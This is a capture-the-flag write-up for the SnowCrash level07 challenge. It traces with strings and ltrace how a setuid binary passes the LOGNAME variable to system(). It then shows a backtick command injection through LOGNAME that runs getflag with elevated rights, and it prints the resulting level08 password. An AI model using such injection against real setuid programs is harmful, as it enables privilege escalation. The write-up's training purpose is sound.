# Objective

As `level07`, the goal is to exploit a vulnerability to gain `flag07`'s privileges and read the flag, which is the password for `level08`.

The flag is gained through the command `getflag`, run as `flag07`.

```sh
level07@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

```sh
level07@SnowCrash:~$ pwd
/home/user/level07

level07@SnowCrash:~$ ll
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
```

### File type

```sh
level07@SnowCrash:~$ file level07 
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

### Behavior

```sh
level07@SnowCrash:~$ ./level07 
level07
```

# Resolution


```sh
level07@SnowCrash:~$ strings level07 
# Values...
GLIBC_2.0
PTRh 
UWVS
[^_]
LOGNAME         # The program contains the string "LOGNAME"
/bin/echo %s    # At some point, it seems to use a string format
# ...to be continued
```

The program seem to be interested in LOGNAME. Why ?

```sh
level07@SnowCrash:~$ ltrace -f ./level07 2>&1 | grep getenv
[pid 2587] getenv("LOGNAME")                     = "level07"
[pid 2589] getenv("POSIXLY_CORRECT")             = NULL
```

The basic program output might actually may be related to the `LOGNAME` environment variable.

```sh
level07@SnowCrash:~$ LOGNAME=toto ./level07 
toto
```

It is!

```sh
level07@SnowCrash:~$ LOGNAME='SEE_ME_I_M_BIG' ltrace -f ./level07 2>&1  | grep "SEE_ME"
[pid 2852] getenv("LOGNAME")                     = "SEE_ME_I_M_BIG"
[pid 2852] system("/bin/echo SEE_ME_I_M_BIG " <unfinished ...>
[pid 2853] strchr("LOGNAME=SEE_ME_I_M_BIG", '=') = "=SEE_ME_I_M_BIG"
[pid 2853] strlen("/bin/echo SEE_ME_I_M_BIG ")   = 25
[pid 2853] strcspn("SEE_ME_I_M_BIG", "\210\203\201\202\204\207") = 14
[pid 2854] strcmp("SEE_ME_I_M_BIG", "--help")    = 1
[pid 2854] strcmp("SEE_ME_I_M_BIG", "--version") = 1
[pid 2854] fflush(0xb7fd1a20SEE_ME_I_M_BIG
```

Interestingly, the program calls `system` on whatever string we pass it as `LOGNAME`.

Let us try some injection.

```sh
level07@SnowCrash:~$ LOGNAME='`getflag`' ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Bingo!

```sh
level07@SnowCrash:~$ su - level08
Password: # fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$ 
```